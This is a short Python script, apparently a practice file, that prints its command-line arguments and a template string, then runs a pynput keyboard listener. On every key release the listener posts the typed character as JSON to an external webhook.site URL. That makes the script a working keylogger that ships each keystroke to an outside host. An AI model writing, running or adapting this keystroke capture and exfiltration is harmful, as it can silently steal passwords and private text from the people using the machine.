from utils.utils import print_line
from pynput.keyboard import Listener
import sys
import json
import requests

var = 88
var2 = 1

print_line()
print(sys.argv[1])
print(sys.argv)
print_line()

print(f"This is basically a template string {var} {var2}")


def send_event(event_data):
    webhook_url = "https://webhook.site/cdeb7ea5-22c8-4459-8b43-7b9389241638"

    r = requests.post(webhook_url, data=json.dumps(event_data), headers={
        "Content-Type": "application/json"})


def on_press(key):
    print("Key pressed")


def on_release(key):
    # print("Key released", key)
    send_event({"key": key.char})
    print("sent event")


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
